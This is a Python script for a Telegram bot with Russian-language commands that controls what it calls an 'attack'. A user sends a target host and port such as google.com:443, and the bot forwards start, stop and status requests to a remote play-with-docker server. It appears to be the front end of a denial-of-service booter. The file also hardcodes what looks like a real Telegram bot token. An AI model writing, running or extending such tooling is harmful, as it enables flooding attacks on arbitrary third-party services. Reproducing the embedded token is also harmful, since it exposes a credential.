import os

os.system("pip install telebot")
os.system("pip install requests")

import telebot
import requests

bot = telebot.TeleBot("6989513685:AAHSpFk79QnIdiHnGgeXJO5gmKM4oUMY4ZA")

@bot.message_handler(func = lambda message: True)
def echo_message(message):
 if message.text == "Помощь" or message.text == "помощь":
  bot.send_message(message.chat.id, "Например вводишь команды:\n1) <ваша ссылка>:<порт> - google.com:443\n2) Помощь - помощь с командами\n3) Стоп - остановить атаку\n4) Статус - посмотреть статус атаки")
 elif message.text == "Статус" or message.text == "статус":
  view = requests.get("http://ip172-18-0-6-cl2ddaksnmng009torbg-8080.direct.labs.play-with-docker.com/status")
  if view.text == "Started!":
   bot.send_message(message.chat.id, "Атака активна!")
  else:
   bot.send_message(message.chat.id, "Атака не активна!")
 elif message.text == "Стоп" or message.text == "стоп":
  view = requests.get("http://ip172-18-0-6-cl2ddaksnmng009torbg-8080.direct.labs.play-with-docker.com/stop")
  bot.send_message(message.chat.id, view.text)
 elif message.text == message.text:
  chat = message.text
  view = requests.get(f"http://ip172-18-0-6-cl2ddaksnmng009torbg-8080.direct.labs.play-with-docker.com/{chat}")
  bot.send_message(message.chat.id, view.text)

bot.polling(none_stop=True)
